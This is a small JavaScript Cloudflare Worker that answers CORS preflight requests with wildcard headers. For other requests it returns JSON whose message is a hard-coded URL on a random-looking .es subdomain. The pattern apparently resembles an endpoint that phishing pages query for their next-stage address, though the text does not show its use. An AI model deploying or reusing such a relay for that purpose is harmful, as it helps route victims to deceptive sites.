// Reference: https://developers.cloudflare.com/workers/examples/cors-header-proxy
const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET,HEAD,POST,OPTIONS",
    "Access-Control-Max-Age": "86400",
}

function handleOptions(request) {
    // Make sure the necessary headers are present
    // for this to be a valid pre-flight request
    let headers = request.headers
    if (
        headers.get("Origin") !== null &&
        headers.get("Access-Control-Request-Method") !== null &&
        headers.get("Access-Control-Request-Headers") !== null
    ) {
        // Handle CORS pre-flight request.
        let respHeaders = {
            ...corsHeaders,
            // Allow all future content Request headers to go back to browser
            "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers"),
        }
        return new Response(null, {
            headers: respHeaders,
        })
    }
    else {
        // Handle standard OPTIONS request.
        return new Response(null, {
            headers: {
                Allow: "GET, HEAD, POST, OPTIONS",
            },
        })
    }
}

async function handleRequest(request) {
    if (request.method === "OPTIONS") {
        return handleOptions(request)
    }
    
    // Return your JSON data
    const data = {
        "status": "success",
        "message": "https://D1zT.erhdvbvytrjt.es/qhP3o9/"
    }
    
    return new Response(JSON.stringify(data), {
        headers: {
            "Content-Type": "application/json",
            ...corsHeaders
        }
    })
}

addEventListener("fetch", (event) => {
    event.respondWith(
        handleRequest(event.request).catch(
            (err) => new Response(err.stack, { status: 500 })
        )
    );
});
